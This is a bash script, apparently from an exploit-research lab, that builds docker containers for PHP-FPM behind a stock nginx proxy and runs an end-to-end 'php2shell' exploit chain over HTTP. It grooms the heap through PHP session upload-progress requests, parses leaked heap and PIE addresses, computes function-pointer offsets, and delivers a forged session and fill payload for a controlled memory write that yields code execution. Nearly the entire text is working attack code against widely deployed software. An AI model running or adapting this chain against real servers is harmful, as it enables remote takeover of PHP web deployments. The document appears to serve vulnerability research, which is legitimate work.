#!/usr/bin/env bash
# Full php2shell FPM chain delivered END-TO-END OVER HTTP through a STOCK-DEFAULT
# nginx reverse proxy, with php-fpm NOT reachable by the client (no published fpm
# port; the client only ever talks to nginx on 127.0.0.1:NGINX_PORT).
#
# This proves the direct-FastCGI socket and `fastcgi_request_buffering off` that
# run_native.sh / nginx.conf use were lab conveniences, not requirements. Both
# the heap+PIE leak and the controlled write ride plain HTTP. The only HTTP
# adaptations vs the direct-fpm chain:
#   1. the leak groom moves OFF the query string (a ~49 KB query string, which a
#      default nginx 414s) INTO the POST body (QS_IN_BODY=1), reflected via
#      post.php / $_POST;
#   2. the POST-parse allocation order shifts the reclaim by one slot, folded
#      into DCONST (+0x38 vs the GET-layout d = heap + 0x193bd8).
#
# nginx runs stock defaults (nginx-default.conf): default fastcgi_request_buffering,
# default large_client_header_buffers / client_header_buffer_size. The only raised
# knob is client_max_body_size 16m, which any upload-progress deployment already
# needs (the vector is PHP_SESSION_UPLOAD_PROGRESS file uploads).
#
# Reliability is per FRESH worker: the leak over-read needs a reasonably pristine
# heap, so the runner recreates the fpm container each invocation. Re-run on a miss.
#
# Env: DCONST, LEAK_TRIES, NGINX_PORT, IMAGE, NO_SETUP=1 (reuse existing containers).
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
NAME=${NAME:-p2s-native}
NGINX=${NGINX:-p2s-nginx-default}
NGINX_PORT=${NGINX_PORT:-9005}
NET=${NET:-p2s-fpm-net}
IMAGE=${IMAGE:-php:8.5.11-fpm}
NGINX_IMAGE=${NGINX_IMAGE:-nginx:alpine}
INI=${INI:-/usr/local/etc/php/php.ini-production}
POOL_CONF=${POOL_CONF:-zz-single.conf}
NGINX_CONF=${NGINX_CONF:-nginx-default.conf}
NGINX_URL="http://127.0.0.1:$NGINX_PORT"
A=11111111111111111111111111111111
LB=22222222222222222222222222222222
EB=33333333333333333333333333333333
PROOF=/tmp/fpm5_proof
DCONST=${DCONST:-0x193c10}
LEAK_TRIES=${LEAK_TRIES:-8}
NO_SETUP=${NO_SETUP:-0}

# --- fresh lab: fpm (NO published port, alias = nginx upstream) + stock nginx ---
if [ "$NO_SETUP" != 1 ]; then
    docker network inspect "$NET" >/dev/null 2>&1 || docker network create "$NET" >/dev/null
    docker rm -f "$NAME" "$NGINX" >/dev/null 2>&1 || true
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-http \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        "$IMAGE" php-fpm -F -c "$INI" >/dev/null
    # fpm must be up before nginx, which resolves the upstream alias once at start.
    sleep 1.5
    docker run -d --name "$NGINX" --network "$NET" \
        -p 127.0.0.1:"$NGINX_PORT":80 \
        -v "$HERE/$NGINX_CONF:/etc/nginx/conf.d/default.conf:ro" \
        "$NGINX_IMAGE" >/dev/null
    sleep 1.2
fi

docker port "$NAME" 2>/dev/null | grep -q . && echo "[warn] fpm has a published port; this test wants it unexposed" >&2 || true

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/native_small
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp /tmp/native_small "$NAME:/tmp/sess_$LB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$LB"
docker exec "$NAME" rm -f "$PROOF"

PRE=${PRE:-24576}
A_URL="$NGINX_URL/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"

HEAP=""; PIE=""
for attempt in $(seq 1 "$LEAK_TRIES"); do
    HEAP=""; PIE=""
    docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
    curl --max-time 30 -s -o /dev/null -w "[leak] A http=%{http_code}\n" -b "PHPSESSID=$A" "$A_URL"
    QS_IN_BODY=1 python3 -I "$HERE/http_deliver.py" "$NGINX_URL" "$LB" feffffffffffffff 0 0 0 4088 12 \
        /var/www/html/post.php /tmp/http_leak.bin >/dev/null 2>&1 || true
    read -r HEAP PIE < <(python3 - <<'PY'
import struct,sys
d=open('/tmp/http_leak.bin','rb').read()
raw=None
for ln in d.split(b'\n'):
    # the over-read var is whichever reflects 12345 bytes
    if b':' in ln:
        k,_,v=ln.partition(b':')
        if len(v)//2==12345:
            raw=bytes.fromhex(v.decode()); break
if raw is None or len(raw)<0x3010: sys.exit(1)
heap=struct.unpack_from('<Q',raw,0x98)[0]
pie =struct.unpack_from('<Q',raw,0x3008)[0]
if not (0x100000000000<heap<0x800000000000): sys.exit(1)
if pie<=0x100000000000 or (pie&0xfff)!=0x777: sys.exit(1)
print('%#x %#x'%(heap,pie))
PY
) || true
    [ -n "${HEAP:-}" ] && [ -n "${PIE:-}" ] && { echo "[leak] ok attempt $attempt"; break; }
    echo "[leak] attempt $attempt failed" >&2; sleep 0.3
done
[ -z "${HEAP:-}" ] && { echo "[leak] FAILED (re-run; the leak wants a fresh worker)" >&2; exit 2; }

D=$((HEAP + DCONST)); BASE=$((PIE - 0x7c9777)); ZIF=$((BASE + 0x60e3a0))
printf "[leak] heap=%#x pie=%#x\n[calc] d=%#x (dconst=%s) base=%#x zif=%#x d_low12=%#x\n" \
  "$HEAP" "$PIE" "$D" "$DCONST" "$BASE" "$ZIF" $((D & 0xfff))

printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%s;' \
  $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$ZIF" > /tmp/native_sess_T
python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" --infile "$HERE/payload/fillU.bin" \
  --out /tmp/native_fill.bin --nogdb >/dev/null
docker cp /tmp/native_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"

docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
curl --max-time 30 -s -o /dev/null -w "[exploit] A http=%{http_code}\n" -b "PHPSESSID=$A" "$A_URL"
python3 -I "$HERE/http_deliver.py" "$NGINX_URL" "$EB" feffffffffffffff "${XPAD:-0}" 0 1 0 0 \
    /var/www/html/index.php /tmp/http_b.out 12000 150 8170 /tmp/native_fill.bin 2>&1 || true
sleep 0.5

if docker cp "$NAME:$PROOF" /tmp/http_full_proof.out >/dev/null 2>&1; then
    echo "[proof] $PROOF (delivered over HTTP via nginx $NGINX_URL, fpm unexposed):"
    cat /tmp/http_full_proof.out
else
    echo "[proof] missing; full HTTP chain did not land (re-run on a fresh worker)" >&2; exit 1
fi
